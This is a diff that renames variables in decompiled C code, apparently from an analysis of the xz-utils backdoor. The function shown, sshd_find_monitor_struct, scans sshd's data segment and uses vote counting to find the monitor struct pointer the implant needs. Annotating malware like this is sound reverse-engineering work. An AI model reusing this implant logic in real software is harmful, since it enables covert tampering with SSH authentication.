@@ -18,28 +18,28 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
 
 {
   u8 *code_start;
-  BOOL BVar1;
+  BOOL secret_append_ok;
   u8 *data_start;
   u8 *data_end;
-  ulong uVar2;
-  uint uVar3;
-  long lVar4;
-  ulong uVar5;
-  long lVar6;
-  void **ppvVar7;
-  uint *puVar8;
-  byte bVar9;
+  ulong candidate_slot;
+  uint top_vote_count;
+  long vote_inner_idx;
+  ulong winning_candidate_idx;
+  long vote_idx;
+  void **candidate_cursor;
+  uint *vote_cursor;
+  u8 zero_seed;
   u64 data_segment_size;
   uint monitor_vote_table[20];
   void *monitor_candidates[10];
   
-  bVar9 = 0;
-  BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xda,0x14,0xf,FALSE);
-  if ((BVar1 != FALSE) && (data_segment_size = 0, ctx->sshd_ctx->mm_request_send_start != (void *)0x0)) {
+  zero_seed = 0;
+  secret_append_ok = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xda,0x14,0xf,FALSE);
+  if ((secret_append_ok != FALSE) && (data_segment_size = 0, ctx->sshd_ctx->mm_request_send_start != (void *)0x0)) {
     ctx->struct_monitor_ptr_address = (monitor **)0x0;
     data_start = (u8 *)elf_get_data_segment(elf,&data_segment_size,FALSE);
     if (data_start != (u8 *)0x0) {
-      lVar6 = 0;
+      vote_idx = 0;
       data_end = data_start + data_segment_size;
       monitor_vote_table[0] = 4;
       monitor_vote_table[1] = 5;
@@ -51,53 +51,53 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
       monitor_vote_table[7] = 0xb;
       monitor_vote_table[8] = 0xc;
       monitor_vote_table[9] = 0xd;
-      ppvVar7 = monitor_candidates;
-      for (lVar4 = 0x14; lVar4 != 0; lVar4 = lVar4 + -1) {
-        *(undefined4 *)ppvVar7 = 0;
-        ppvVar7 = (void **)((long)ppvVar7 + (ulong)bVar9 * -8 + 4);
+      candidate_cursor = monitor_candidates;
+      for (vote_inner_idx = 0x14; vote_inner_idx != 0; vote_inner_idx = vote_inner_idx + -1) {
+        *(undefined4 *)candidate_cursor = 0;
+        candidate_cursor = (void **)((long)candidate_cursor + (ulong)zero_seed * -8 + 4);
       }
       do {
-        code_start = (u8 *)refs->entries[monitor_vote_table[lVar6]].func_start;
+        code_start = (u8 *)refs->entries[monitor_vote_table[vote_idx]].func_start;
         if (code_start != (u8 *)0x0) {
           sshd_find_monitor_field_addr_in_function
-                    (code_start,(u8 *)refs->entries[monitor_vote_table[lVar6]].func_end,data_start,data_end,
-                     monitor_candidates + lVar6,ctx);
+                    (code_start,(u8 *)refs->entries[monitor_vote_table[vote_idx]].func_end,data_start,data_end,
+                     monitor_candidates + vote_idx,ctx);
         }
-        lVar6 = lVar6 + 1;
-      } while (lVar6 != 10);
-      puVar8 = monitor_vote_table + 10;
-      for (lVar4 = 10; lVar4 != 0; lVar4 = lVar4 + -1) {
-        *puVar8 = 0;
-        puVar8 = puVar8 + (ulong)bVar9 * -2 + 1;
+        vote_idx = vote_idx + 1;
+      } while (vote_idx != 10);
+      vote_cursor = monitor_vote_table + 10;
+      for (vote_inner_idx = 10; vote_inner_idx != 0; vote_inner_idx = vote_inner_idx + -1) {
+        *vote_cursor = 0;
+        vote_cursor = vote_cursor + (ulong)zero_seed * -2 + 1;
       }
-      lVar4 = 0;
+      vote_inner_idx = 0;
       do {
-        uVar2 = 0;
+        candidate_slot = 0;
         do {
-          uVar5 = uVar2 & 0xffffffff;
-          if ((uint)lVar4 <= (uint)uVar2) {
-            monitor_vote_table[lVar4 + 10] = monitor_vote_table[lVar4 + 10] + 1;
+          winning_candidate_idx = candidate_slot & 0xffffffff;
+          if ((uint)vote_inner_idx <= (uint)candidate_slot) {
+            monitor_vote_table[vote_inner_idx + 10] = monitor_vote_table[vote_inner_idx + 10] + 1;
             goto LAB_00103f07;
           }
-          ppvVar7 = monitor_candidates + uVar2;
-          uVar2 = uVar2 + 1;
-        } while (*ppvVar7 != monitor_candidates[lVar4]);
-        monitor_vote_table[uVar5 + 10] = monitor_vote_table[uVar5 + 10] + 1;
+          candidate_cursor = monitor_candidates + candidate_slot;
+          candidate_slot = candidate_slot + 1;
+        } while (*candidate_cursor != monitor_candidates[vote_inner_idx]);
+        monitor_vote_table[winning_candidate_idx + 10] = monitor_vote_table[winning_candidate_idx + 10] + 1;
 LAB_00103f07:
-        lVar4 = lVar4 + 1;
-      } while (lVar4 != 10);
-      uVar2 = 0;
-      uVar5 = 0;
-      uVar3 = 0;
+        vote_inner_idx = vote_inner_idx + 1;
+      } while (vote_inner_idx != 10);
+      candidate_slot = 0;
+      winning_candidate_idx = 0;
+      top_vote_count = 0;
       do {
-        if (uVar3 < monitor_vote_table[uVar2 + 10]) {
-          uVar5 = uVar2 & 0xffffffff;
-          uVar3 = monitor_vote_table[uVar2 + 10];
+        if (top_vote_count < monitor_vote_table[candidate_slot + 10]) {
+          winning_candidate_idx = candidate_slot & 0xffffffff;
+          top_vote_count = monitor_vote_table[candidate_slot + 10];
         }
-        uVar2 = uVar2 + 1;
-      } while (uVar2 != 10);
-      if ((4 < uVar3) && ((monitor **)monitor_candidates[uVar5] != (monitor **)0x0)) {
-        ctx->struct_monitor_ptr_address = (monitor **)monitor_candidates[uVar5];
+        candidate_slot = candidate_slot + 1;
+      } while (candidate_slot != 10);
+      if ((4 < top_vote_count) && ((monitor **)monitor_candidates[winning_candidate_idx] != (monitor **)0x0)) {
+        ctx->struct_monitor_ptr_address = (monitor **)monitor_candidates[winning_candidate_idx];
         return TRUE;
       }
     }
